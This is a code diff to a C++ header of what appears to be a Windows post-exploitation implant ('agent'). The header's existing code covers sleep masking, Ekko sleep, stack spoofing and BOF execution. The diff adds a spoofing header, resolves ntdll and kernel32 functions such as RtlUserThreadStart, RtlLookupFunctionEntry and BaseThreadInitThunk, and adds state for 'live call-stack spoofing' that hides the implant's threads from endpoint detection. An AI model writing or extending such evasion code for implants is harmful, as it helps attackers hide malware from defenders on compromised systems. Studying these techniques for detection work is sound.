@@ -8,6 +8,7 @@
 #include <LdrLoad.h>
 #include <Hash.h>
 #include <wininet.h>
+#include <Spoof.h>
 
 // Magic value stored inside the agent we use to find it by scanning PEB heaps
 #define AGENT_HEAP_MAGIC 0xC0DED00DC0FFEE
@@ -84,9 +85,13 @@ namespace Root
             DECLAPI( NtSignalAndWaitForSingleObject  );
             DECLAPI( NtContinue                      );
             DECLAPI( NtClose                         );
+            DECLAPI( NtQueryVirtualMemory            );
             // stack spoofing
             DECLAPI( NtGetContextThread              );
             DECLAPI( NtSetContextThread              );
+            // live call-stack spoofing
+            DECLAPI( RtlUserThreadStart              );
+            DECLAPI( RtlLookupFunctionEntry          );
         } Ntdll = {
             RSL_TYPE( RtlAllocateHeap   ),
             RSL_TYPE( RtlReAllocateHeap ),
@@ -110,8 +115,11 @@ namespace Root
             RSL_TYPE( NtSignalAndWaitForSingleObject ),
             RSL_TYPE( NtContinue                     ),
             RSL_TYPE( NtClose                        ),
+            RSL_TYPE( NtQueryVirtualMemory           ),
             RSL_TYPE( NtGetContextThread             ),
             RSL_TYPE( NtSetContextThread             ),
+            RSL_TYPE( RtlUserThreadStart             ),
+            RSL_TYPE( RtlLookupFunctionEntry         ),
         };
 
         // kernel32.dll
@@ -142,6 +150,8 @@ namespace Root
             // sleep mask
             DECLAPI( WaitForSingleObjectEx );
             DECLAPI( SetEvent              );
+            // live call-stack spoofing
+            DECLAPI( BaseThreadInitThunk   );
             // stack spoofing
             DECLAPI( DuplicateHandle       );
             // Ekko sleep: thread enumeration for random-thread spoof context
@@ -173,6 +183,7 @@ namespace Root
             RSL_TYPE( TerminateProcess     ),
             RSL_TYPE( WaitForSingleObjectEx ),
             RSL_TYPE( SetEvent              ),
+            RSL_TYPE( BaseThreadInitThunk   ),
             RSL_TYPE( DuplicateHandle       ),
             RSL_TYPE( CreateToolhelp32Snapshot ),
             RSL_TYPE( Thread32First            ),
@@ -269,6 +280,11 @@ namespace Root
             UINT32 OutputCap;  // current buffer capacity
         } Bof = {};
 
+
+        // live call-stack spoofing state - populated once by Spoof_Init()
+        struct {
+            SpoofSetup Setup;
+        } Spf = {};
 
         // constructor - resolves base address and core API's
         // declaration of the Agent.cc
